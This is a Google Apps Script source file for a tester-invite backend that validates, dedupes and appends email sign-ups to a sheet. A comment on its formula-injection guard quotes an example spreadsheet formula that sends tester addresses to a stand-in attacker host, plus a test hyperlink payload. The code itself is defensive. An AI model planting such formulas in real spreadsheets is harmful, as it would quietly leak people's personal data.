/**
 * GlobalStudyBoard — Android beta-tester invite backend (Google Apps Script).
 *
 * THIS FILE MIRRORS THE DEPLOYED SCRIPT and is the source of truth — keep the
 * two in sync. The script is bound to its own spreadsheet, **"GlobalStudyBoard
 * App Testers"**. It is deliberately SEPARATE from the VedKosh
 * "VedKosh Content Actions" sheet/script, which serves other tasks; never point
 * this site at that one.
 *
 * FLOW
 *   Website "Get the Android app"  ->  components/TesterInviteModal.tsx
 *     ->  POST /api/tester-invite  (validates, rate-limits, drops honeypots)
 *     ->  this web app             (dedupes, appends a row)
 *     ->  sheet "Testers"          (owner reads it, adds the address in the
 *                                   Play Console, Play emails the invite)
 *
 * OWNER SETUP / UPDATE (one time, ~3 minutes):
 *   1. Open the "GlobalStudyBoard App Testers" spreadsheet.
 *   2. Extensions -> Apps Script.
 *   3. In Code.gs: Select-All (Cmd/Ctrl+A) -> Delete -> paste THIS entire file.
 *   4. Save (Cmd/Ctrl+S).
 *   5. Deploy -> New deployment -> type "Web app"
 *        Execute as:      Me
 *        Who has access:  Anyone
 *      -> Deploy -> Authorize access -> copy the /exec URL.
 *   6. Put that URL in Vercel as the env var TESTER_INVITE_SCRIPT_URL
 *      (Production + Preview + Development), then redeploy.
 *
 *   To CHANGE the code later: edit here, then
 *   Deploy -> Manage deployments -> pencil/Edit -> Version "New version" -> Deploy.
 *   Editing the EXISTING deployment keeps the same /exec URL, so no env change
 *   is needed. Do NOT use "New deployment" — that mints a new URL and breaks
 *   TESTER_INVITE_SCRIPT_URL.
 *
 * SHEET
 *   Testers [Timestamp | Email | Page | Region | Source | Status]
 *   Status starts as "pending". The owner sets it to "invited" after adding the
 *   address to the "GlobalStudyBoard Testers" list in the Play Console.
 *
 * CONTRACT WITH THE SITE (do not rename fields — see app/api/tester-invite/route.ts):
 *   POST {type:'tester-invite', email, page, region, source} -> appends a row
 *   GET  ?ping=1                                             -> {"status":"ok"}
 *
 * PRIVACY (site constitution §9): the email is the only personal datum, it is
 * volunteered for exactly this purpose, and it is used solely to send the Play
 * invite. Do not add analytics, do not forward it anywhere else, and do not
 * expose it through doGet — the GET handler must never return stored addresses.
 */

var SHEET_NAME = 'Testers';
var HEADERS = ['Timestamp', 'Email', 'Page', 'Region', 'Source', 'Status'];

function json_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(
    ContentService.MimeType.JSON
  );
}

function getTesterSheet_(ss) {
  var sheet = ss.getSheetByName(SHEET_NAME);
  if (!sheet) sheet = ss.insertSheet(SHEET_NAME);
  // Backfill the header row whether the tab was just created or already existed
  // but is empty, so the first captured address never lands in row 1.
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(HEADERS);
    sheet.getRange(1, 1, 1, HEADERS.length).setFontWeight('bold');
    sheet.setFrozenRows(1);
  }
  return sheet;
}

/** Structural check only — Play testers may use any Google account domain. */
function looksLikeEmail_(email) {
  var at = email.indexOf('@');
  var dot = email.lastIndexOf('.');
  return (
    email.length > 4 &&
    email.length <= 254 &&
    at > 0 &&
    dot > at + 1 &&
    dot < email.length - 1 &&
    email.indexOf(' ') === -1
  );
}

/**
 * Neutralise spreadsheet formula injection.
 *
 * Google Sheets EVALUATES a string written by appendRow if it starts with =, +, -
 * or @ (a leading TAB/CR can also start one). This web app is deployed "Who has
 * access: Anyone", so every value arriving here is attacker-controllable if the
 * /exec URL ever leaks — and a payload such as
 *   =IMPORTXML("https://attacker.example/?d="&B2, "//x")
 * would fire the moment the owner opens the sheet and quietly exfiltrate the
 * tester addresses in column B. Prefixing with an apostrophe forces Sheets to
 * store the value as literal text; the apostrophe is not shown in the cell.
 *
 * Verified 2026-09-03: without this, a posted page value of
 * =HYPERLINK("http://evil.test","click") rendered as a live link in the sheet.
 */
function safeCell_(v) {
  var s = String(v == null ? '' : v);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

function doPost(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var data = JSON.parse(e.postData.contents);

    if (data.type !== 'tester-invite') {
      return json_({ error: 'Unknown type' });
    }

    var email = String(data.email || '').trim().toLowerCase();
    if (!looksLikeEmail_(email)) {
      return json_({ error: 'Invalid email' });
    }

    // Read-then-append is not atomic: two visitors submitting the same address at
    // the same moment would both miss the dedupe and write two rows. A short
    // script lock makes the pair atomic; if the lock cannot be had we still write
    // rather than lose the sign-up, since a duplicate row is far cheaper than a
    // lost tester.
    var lock = LockService.getScriptLock();
    var locked = false;
    try {
      locked = lock.tryLock(10000);
    } catch (lockErr) {
      locked = false;
    }

    try {
      var sheet = getTesterSheet_(ss);

      // Dedupe on the email column so a double-tap or a returning visitor never
      // creates a second row for the owner to work through.
      var lastRow = sheet.getLastRow();
      if (lastRow > 1) {
        var existing = sheet.getRange(2, 2, lastRow - 1, 1).getValues();
        for (var i = 0; i < existing.length; i++) {
          if (String(existing[i][0]).trim().toLowerCase() === email) {
            return json_({ status: 'ok', duplicate: true });
          }
        }
      }

      // Every cell goes through safeCell_ — see the note on formula injection.
      sheet.appendRow([
        new Date(),
        safeCell_(email),
        safeCell_(String(data.page || '').substring(0, 200)),
        safeCell_(String(data.region || '').substring(0, 40)),
        safeCell_(String(data.source || 'website').substring(0, 40)),
        'pending',
      ]);
    } finally {
      if (locked) lock.releaseLock();
    }

    return json_({ status: 'ok' });
  } catch (err) {
    return json_({ error: String(err && err.message ? err.message : err) });
  }
}

/**
 * Health check only. This MUST NOT return any stored address — the sheet is the
 * single place tester emails live, and this endpoint is public.
 */
function doGet() {
  return json_({ status: 'ok' });
}
